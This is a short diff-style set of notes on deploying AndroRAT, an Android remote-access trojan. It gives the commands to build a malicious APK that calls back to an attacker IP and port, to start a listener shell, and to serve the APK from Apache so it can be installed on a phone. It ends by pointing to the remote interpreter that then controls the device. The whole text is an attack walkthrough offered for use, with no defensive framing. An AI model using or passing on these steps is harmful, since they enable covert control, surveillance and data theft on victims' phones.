@@ -1,0 +1,13 @@
+└─$ python3 androRAT.py --build -i 192.168.1.9 -p 4444 -o tester.apk
+ python3 androRAT.py --shell -i 0.0.0.0 -p 4444 
+ 
+ 
+ *Open another terminal on the side*
+ 
+ sudo systemctl start apache2.service
+ cd AndroRAT/
+ sudo cp tester.apk /var/www/html
+ 
+ Once apk installed on the phone and the interpreter has started turn off apache.
+ 
+ Start using the interpreter by the command help to check what all you can do!
